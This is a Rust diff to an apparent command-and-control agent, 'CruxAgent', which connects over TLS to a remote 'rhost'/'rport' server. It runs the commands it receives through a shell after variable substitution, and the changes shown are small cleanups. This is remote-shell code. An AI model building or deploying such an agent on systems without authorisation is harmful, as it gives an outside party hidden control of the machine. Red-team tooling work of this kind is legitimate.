@@ -89,8 +89,7 @@ fn variable_substitution(command: &str, var_map: &HashMap<String, String>) -> St
         var_map
             .get(var_name)
             .cloned()
-            .or_else(|| env::var(var_name).ok())
-            .unwrap_or_default()
+            .unwrap_or(format!("${}", var_name))
     });
 
     result.to_string()
@@ -98,12 +97,11 @@ fn variable_substitution(command: &str, var_map: &HashMap<String, String>) -> St
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
     let args = CruxAgentArgs::parse();
-    // println!("Connected to {} on port {}", args.rhost, args.rport);
 
     // Connect to CruxServer via TLS
     let connector = TlsConnector::builder()
         .danger_accept_invalid_certs(!args.verify_cert)
-        .build().unwrap(); // TODO: Find a better way to handle this error
+        .build().unwrap();
 
     let ip_str = format!("{}:{}", args.rhost, args.rport);
     let stream = TcpStream::connect(ip_str)?;
@@ -163,7 +161,6 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
                 };
             }
             CmdType::Export =>{
-                // TODO: Implement Environment Variable exporting
                 match parse_var_def(&received_cmd.args) {
                     Ok(var_tuple) => {
                         unsafe {
@@ -177,7 +174,6 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
                 };
             }
             CmdType::Exec => {
-                // TODO: Implement variable subsitution
                 let subsituted_args = variable_substitution(&received_cmd.args, &shell_var_map);
 
                 let execution = Exec::shell(subsituted_args)
